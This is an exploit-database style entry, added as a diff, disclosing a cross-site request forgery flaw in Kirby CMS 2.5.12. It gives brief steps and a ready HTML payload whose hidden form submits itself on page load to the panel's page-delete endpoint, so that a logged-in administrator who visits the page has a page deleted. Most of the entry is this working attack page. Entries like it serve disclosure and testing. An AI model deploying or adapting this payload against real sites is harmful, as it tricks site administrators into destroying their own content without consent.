@@ -1,0 +1,31 @@
+# Exploit Title:​​ Kirby CMS 2.5.12 - Cross-Site Request Forgery (Delete Page)
+# Date: 2018-07-22
+# Exploit Author: Zaran Shaikh
+# Version: 2.5.12
+# CVE: NA
+# Category: Web Application
+
+# 1. Description
+# The application allows malicious HTTP requests to be sent in order to
+# trick a user into adding/ deleting web pages.
+
+# 2. Proof of Concept
+
+1. Visit the application
+2. Go to add page option
+3. Create a crafted HTTP page with delete/ add option and host it on
+a server. Upon sending the link to a user and upon click, it gets triggered
+and the page is added/deleted
+4. Payload:
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/kirby/panel/pages/csrf-test-page/delete">
+      <input type="hidden" name="&#95;redirect" value="site&#47;subpages" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
